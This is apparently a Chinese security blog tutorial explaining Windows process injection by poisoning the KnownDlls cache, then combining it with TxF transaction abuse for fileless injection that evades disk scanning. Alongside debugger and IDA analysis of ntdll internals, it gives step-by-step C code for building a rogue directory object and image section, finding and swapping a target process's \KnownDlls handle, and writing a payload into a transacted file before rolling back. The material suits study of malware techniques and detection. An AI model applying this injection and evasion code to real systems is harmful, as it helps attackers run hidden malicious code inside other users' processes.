## **前言**  

本文是对 Windows Process Injection: KnownDlls Cache
Poisoning的整理学习，并与Herpadering技术结合实现无文件注入。

##  **01** **什么是KnownDlls**

KnownDLL是一种用来缓存常用系统DLL的Windows机制。该机制保证系统将如shell32.dll等系统DLL可以被安全地从系统文件夹中加载。避免恶意软件在应用程序文件夹放置恶意木马版本的系统DLL造成劫持。

当进程加载动态链接库DLL时，首先会在KnownDlls目录中查找，如果命中，会直接使用已经缓存的系统DLL IMAGE镜像而不需要从磁盘上重新加载。

在注册表HKLM\SYSTEM\CurrentControlSet\Control\Session
Manager\KnownDLLs中可以查看到这些已经被缓存的KnownDll列表，也可以使用sysinternals的WinObj 查看。

如图：使用 WinObj 打开KnownDlls 查看已经缓存的系统DLL

![1651132267_626a476bcc0db51c976df.png!small?1651132268013](https://image.3001.net/images/20220428/1651132267_626a476bcc0db51c976df.png!small?1651132268013)  

##

##  **02** **利用原理**

在NTDLL内对KnownDlls机制的实现，依赖于一个叫LdrpKnownDllDirectoryHandle的全局变量，顾名思义该变量是KnowDlls的根目录对象句柄，该对象会在进程初始化的时候通过ZwOpenDirectoryObject来打开\\\KnownDlls根目录进行初始化，后续再需要加载动态链接库时就可以来直接读取\\\KnownDlls下已经缓存的系统DLL。

使用IDA对LdrpKnownDllDirectoryHandle查找引用，其中包含了进程初始化LdrpInitializeProcess。

![1651132350_626a47be2ed9468064e52.png!small?1651132350306](https://image.3001.net/images/20220428/1651132350_626a47be2ed9468064e52.png!small?1651132350306)

在LdrpInitializeProcess内，会打开 \\\KnownDlls 根目录初始化 LdrpKnownDllDirectoryHandle

如下如所示：

![1651132382_626a47de3682272ba3009.png!small?1651132382370](https://image.3001.net/images/20220428/1651132382_626a47de3682272ba3009.png!small?1651132382370)

查看另一个引用函数LdrpFindKnownDll，代码直接使用NtOpenSection尝试打开目标DLL，如果成功打开将获得对应DLL的IMAGE
SECTION句柄，其中RootDirectory就是LdrpKnownDllDirectoryHandle全局句柄，表示将在\\\KnownDlls根目录下查找对应DLL。

如下如所示：

![1651132396_626a47ecaebf592ed76cd.png!small?1651132397185](https://image.3001.net/images/20220428/1651132396_626a47ecaebf592ed76cd.png!small?1651132397185)

劫持的原理是只要控制目标进程的LdrpKnownDllDirectoryHandle指向我们自己的根目录对象（提前将我们恶意的IMAGE
SECTION创建到该目录下），当目标进程下次需要加载指定的DLL时，就会加载我们的恶意DLL，并主动调用DllMain函数，实现DLL注入。

打开notepad.exe 作为目标进程，使用WinDbg Attach进程后在ntdll!LdrpFindKnowDll下断点。点击notepad.exe
的文件 → 打开 按钮，断点命中，LdrpFindKnowDll的 第一个参数rcx 即为将要加载的dll名称。

如图：这里分别触发加载了comdlg32.dll和ole32.dll的加载。

![1651132413_626a47fd3b0da7511a767.png!small?1651132413706](https://image.3001.net/images/20220428/1651132413_626a47fd3b0da7511a767.png!small?1651132413706)

 **03** **代码实现**

1\. 创建自己的DirectoeyObject对象

    
    
    UNICODE_STRING usDirectoryName;RtlInitUnicodeString(&usDirectoryName, L"\\test");InitializeObjectAttributes(&oaDirectory, &usDirectoryName, 0, NULL, NULL);NtCreateDirectoryObject(&hDirectory, DIRECTORY_ALL_ACCESS, &oaDirectory)));

2\. 打开恶意DLL文件，获得句柄

    
    
    HANDLE hFile = INVALID_HANDLE_VALUE;IO_STATUS_BLOCK iosb;OBJECT_ATTRIBUTES oaFackDllPath;UNICODE_STRING usFackDllPath;RtlDosPathNameToNtPathName_U(my_fackdll, &usFackDllPath, NULL, NULL); // 转换DLL文件路径为NT路径InitializeObjectAttributes(&oaFackDllPath, &usFackDllPath, OBJ_CASE_INSENSITIVE, NULL, NULL);NtOpenFile(&hFile, FILE_GENERIC_READ | FILE_GENERIC_WRITE | FILE_GENERIC_EXECUTE, &oaFackDllPath, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE, 0)

3\. 创建恶意文件的IMAGE SECTION对象

    
    
    // section的对象名称需要为被劫持的DLL名，RootDirectory为第一步中的根目录对象  UNICODE_STRING usTarget;OBJECT_ATTRIBUTES oaTarget;RtlInitUnicodeString(&usTarget, L"ole32.dll");InitializeObjectAttributes(&oaTarget, &usTarget, OBJ_CASE_INSENSITIVE, hDirectory, NULL);// 创建 section， 绑定恶意文件句柄HANDLE hSection;NtCreateSection(&hSection, SECTION_ALL_ACCESS, &oaTarget, NULL, PAGE_READONLY, SEC_IMAGE, hFile);

4\.
打开目标进程，获取KnownDlls对象的Handle值为了后续关闭远程进程的KnownDlls句柄，及时插入我们的新句柄，还需要能够挂起远程进程，暂停它的活动。

    
    
    hProcess = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_SUSPEND_RESUME, FALSE, pid);/*... 这一步需要通过 NtQuerySystemInformation 来枚举系统句柄信息，获取目标进程内名为 “\\KnownDlls” 的句柄值*/

获取目标进程的KnownDlls Handle的部分代码

    
    
    // 循环读取系统Handle信息  while ((st = NtQuerySystemInformation(SystemHandleInformation, pHandleInfoList, dwHandleInfoListSize, NULL)) == STATUS_INFO_LENGTH_MISMATCH)      pHandleInfoList = (PSYSTEM_HANDLE_INFORMATION)realloc(pHandleInfoList, dwHandleInfoListSize *= 2);...// NtQuerySystemInformation 循环处理  for (size_t i = 0; i < pHandleInfoList->NumberOfHandles; i++) {      PSYSTEM_HANDLE_TABLE_ENTRY_INFO pHandleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&(pHandleInfoList->Handles[i]);  ...   /*    过滤掉一些影响 NtDuplicateObject 和 NtQueryObject的 GrantedAccess 值之后  */      // duplicate the handle object      HANDLE dupHandle = NULL;      st = NtDuplicateObject(hProcess, (HANDLE)pHandleInfo->HandleValue, GetCurrentProcess(), &dupHandle, 0, FALSE, DUPLICATE_SAME_ACCESS);      if (!NT_SUCCESS(st))           continue;  ...      /*   成功后 NtQueryObject 查询Handle具体的名称信息， 判断是否为 \\KnownDlls   */      st = NtQueryObject(dupHandle, ObjectNameInformation, pObjNameInfo, objNameInfoSize, &objNameInfoSize);      if (!NT_SUCCESS(st))      {          free(pObjNameInfo);          NtClose(dupHandle);          continue;      }      if (pObjNameInfo->Name.Buffer != NULL)       {          if (!lstrcmpW(pObjNameInfo->Name.Buffer, L"\\KnownDlls"))          {              hKnownDll = (HANDLE)pHandleInfo->HandleValue;              break;          }}

5\. 关闭并重新插入新根目录对象

    
    
    NtSuspendProcess(hProcsss); // 挂起进程DuplicateHandle(hProcsss, target_handle, GetCurrentProcess(), NULL, 0, TRUE, DUPLICATE_CLOSE_SOURCE)); // 关闭远程的 “\\KnownDlls” 句柄DuplicateHandle(GetCurrentProcess(), hDirectory, hProcsss, NULL, 0, TRUE, DUPLICATE_SAME_ACCESS)); // 将我们创建的目录对象复制到目标进程中NtResumeProcess(hProcsss); // 恢复进程CloseHandle(hProcsss);

6\. 使目标触发加载被劫持的KnownDll（记事本点击 文件 -> 打开）

需要注意的是由于我们的IMAGE
SECTION是由当前进程创建的，所以在注入期间还要保证当前进程不退出，这种注入进程的缺点是需要在磁盘上放置恶意DLL文件，且注入完成DLL初始化后使用Procexp.exe
查看能够发现注入的模块痕迹。

如图：

![1651132490_626a484acd34aa908079b.png!small?1651132490913](https://image.3001.net/images/20220428/1651132490_626a484acd34aa908079b.png!small?1651132490913)

##  **04** **结合 TxF 事务创建无文件注入**

对 TxF 事务的滥用又名（Process
Doppelganging）技术，它滥用了windows提供的事务文件操作，能够对磁盘文件进行篡改，使用CreateFileTransacted
打开的文件能够覆写新内容而不影响原有磁盘上的文件数据，得到TxF文件句柄可以用来创建包含新内容的IMAGE
SECTION。规避安全软件对磁盘文件的扫描，避免恶意文件在磁盘上的存留。

由于滥用该技术需要对利用文件具有写权限，因为我们选择将 ole32.dll 临时拷贝其他目录（如c:\windows）下发起利用。

具体步骤为：

1\. 创建NTFS Transcation

    
    
    HANDLE hTransaction;st = NtCreateTransaction(&hTransaction, TRANSACTION_ALL_ACCESS, &oa, NULL, NULL, 0, 0, 0, NULL, NULL);

2\. 在TxF中创建文件写入payload，得到TxF文件句柄

    
    
    // szFilePath 为 c:\window\ole32.dll 目标文件路径HANDLE hTransactedFile = CreateFileTransactedW(szFilePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, hTransaction, NULL, NULL); WriteFile(hTransactedFile, buffer, bufferLen, &dwWrited, NULL);

3\. 使用TxF文件句柄，创建IMAGE SECTION, SECTION的对象名称为被劫持的DLL名，RootDirectory 为之前创建的根目录对象

    
    
    NtCreateSection(pSectionHandle, SECTION_ALL_ACCESS, pSectionOA, 0, PAGE_READONLY, SEC_IMAGE, hTransactedFile);

4\. 回滚事务， 回到对KnownDll的利用

    
    
    NtRollbackTransaction(hTransaction, TRUE)

如图：触发成功

![1651132520_626a486825f73569bb9dc.png!small?1651132520240](https://image.3001.net/images/20220428/1651132520_626a486825f73569bb9dc.png!small?1651132520240)

使用OpenArk 观察到值为0x34的句柄原始对象已被被替换成我们的\test 根目录

![1651132528_626a487031658669afa6c.png!small?1651132528363](https://image.3001.net/images/20220428/1651132528_626a487031658669afa6c.png!small?1651132528363)

Procexp.exe和OpenArk中都没有发现模块痕迹

![1651132533_626a48758b820b99801c5.png!small?1651132533628](https://image.3001.net/images/20220428/1651132533_626a48758b820b99801c5.png!small?1651132533628)

##  **05** **总结**

利用KnownDlls的进程注入

1\. 需要 对目标进程的PROCESS_DUP_HANDLE 和 PROCESS_SUSPEND_RESUME 权限

2\. 能够触发目标进程对指定DLL的加载行为

3\. 配合TxF滥用可以实现无文件注入，但同时会需要对利用文件写权限

 **参考链接：**

 **Windows Process Injection: KnownDlls Cache Poisoning**  
https://modexp.wordpress.com/2019/08/12/windows-process-injection-knowndlls/  
https://googleprojectzero.blogspot.com/2018/10/injecting-code-into-windows-protected.html  
https://github.com/3gstudent/Inject-dll-by-Process-Doppelganging  
 **Winobj**  
https://docs.microsoft.com/en-us/sysinternals/downloads/winobj  
 **OpenArk**  
https://github.com/BlackINT3/OpenArk

